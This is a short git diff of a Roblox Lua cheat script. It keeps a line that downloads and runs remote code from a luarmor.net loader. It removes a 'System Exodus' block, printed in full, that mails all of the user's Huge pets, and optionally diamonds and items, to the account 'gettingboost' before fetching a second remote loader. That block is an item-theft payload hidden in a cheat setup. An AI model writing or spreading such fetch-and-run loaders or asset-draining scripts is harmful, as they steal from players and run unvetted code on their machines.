@@ -16,24 +16,3 @@ getgenv().KiTTYWARE_ElementalWorld = {
     Fps_Boost = true,
 }
 loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/bf88f8790b3e6c196d51b59dc600c9ee.lua"))()
-
-wait(5)
-getgenv().Settings = {
-    Mailing = {
-        ["All Huges"] = {Class = "Pet", Amount = 1, AllTypes = true},
-        --["Giant Coin Jar"] = {Class = "Misc", Amount = 20},
-        --["Rainbow Swirl"] = {Class = "Misc", Amount = "Max"},
-        --["Diamonds"] = {Class = "Currency", Amount = 10000}
-        --["Rainbow Huge Cat"] = {Class = "Pet", Amount = "Max"}
-    },
-    Users = {
-        "gettingboost",
-      --  "Username2",
-      --  "Username3",
-    },
-    ["Split Items Evenly"] = true, --// False -> it will send the Amount per account.
-    ["Only Online Accounts"] = false,
-
-    [[ Thank you for using System Exodus <3! ]]
-}
-loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/86847850c3165379f5be2d9d071eaccb.lua"))()
